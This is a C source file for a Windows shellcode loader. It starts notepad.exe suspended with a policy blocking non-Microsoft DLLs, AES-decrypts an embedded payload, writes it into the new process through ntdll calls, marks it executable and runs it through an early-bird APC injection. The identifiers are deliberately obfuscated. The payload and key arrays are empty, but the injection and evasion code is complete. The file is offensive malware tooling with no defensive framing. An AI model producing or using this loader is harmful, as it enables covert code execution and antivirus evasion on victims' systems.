
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytes,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(WINAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS(WINAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(WINAPI* pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

void thisisthkhal(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}




unsigned char karik12y[] = { };

    unsigned char shellcode[] = {
        
    };




SIZE_T shellcodeSize = sizeof(shellcode); // Set the correct shellcode size

int main() {
    STARTUPINFOEX si = { 0 };  // Changed to STARTUPINFOEX
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX); // Corrected the member reference

    SIZE_T attributeSize = 0;

    // Initialize process thread attributes
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

    DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Using lpAttributeList for STARTUPINFOEX
    si.lpAttributeList = attributes; 

    // Create process in suspended state with attribute list (e.g., mitigation policy)
    if (!CreateProcessA((LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)) {
        printf("[-] Failed to create process\n");
        return 1;
    }

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    // Allocate memory in the remote process using VirtualAllocEx
    PVOID remoteMemory = VirtualAllocExNuma(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    
    
    thisisthkhal((char*)shellcode, shellcodeSize, (char*)karik12y, sizeof(karik12y));

    // Write the shellcode into the allocated remote memory
    SIZE_T bytesWritten;
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    

    NTSTATUS status = NtWriteVirtualMemory(hProcess, remoteMemory, shellcode, shellcodeSize, &bytesWritten);
    

    // Change the memory protection in the remote process (to executable)
    DWORD oldProtect;
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    

    status = NtProtectVirtualMemory(hProcess, &remoteMemory, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    

    // Queue an APC to execute the shellcode in the remote process
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    

    // Queue the APC for remote execution (will invoke the shellcode)
    status = NtQueueApcThread(hThread, (PVOID)remoteMemory, NULL, NULL, NULL);
    
    pNtResumeThread NtResumeThread = (pNtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
    // Resume the remote thread, which will execute the APC
    ULONG previousSuspendCount;
    status = NtResumeThread(hThread, &previousSuspendCount);

    // Cleanup and close handles
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
